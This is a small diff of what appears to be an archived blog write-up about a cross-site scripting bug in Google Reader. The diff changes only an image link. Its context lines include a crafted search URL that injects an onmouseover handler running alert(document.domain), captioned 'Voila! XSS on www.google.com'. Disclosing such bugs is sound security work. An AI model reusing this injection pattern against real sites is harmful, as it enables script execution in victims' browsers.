@@ -138,7 +138,7 @@ function handleEvent(event) {
 
  [https://www.google.com/reader/view/#search/http%3A%2F%2Fcodereview.chromium.org%2F%22onmouseover%3D%22if(!window.a)%7Balert(document.domain)%3Bwindow.a%3D1%7D%2F%2F%22%20ddd/](https://web.archive.org/web/20171003023224/https://www.google.com/reader/view/#search/http%3A%2F%2Fcodereview.chromium.org%2F%22onmouseover%3D%22if(!window.a)%7Balert(document.domain)%3Bwindow.a%3D1%7D%2F%2F%22%20ddd/)
 
-| [![](https://web.archive.org/web/20171003023224im_/http://3.bp.blogspot.com/--vAvbaYevXc/T0Px2xgOF4I/AAAAAAAAE6U/tegnHkPmhlU/s320/linkify.png)](https://web.archive.org/web/20171003023224/http://3.bp.blogspot.com/--vAvbaYevXc/T0Px2xgOF4I/AAAAAAAAE6U/tegnHkPmhlU/s1600/linkify.png) |  |
+| [!](https://web.archive.org/web/20171003023224/http://3.bp.blogspot.com/--vAvbaYevXc/T0Px2xgOF4I/AAAAAAAAE6U/tegnHkPmhlU/s1600/linkify.png) |  |
 | Voila! XSS on www.google.com |  |
 
 ##  Lessons to take
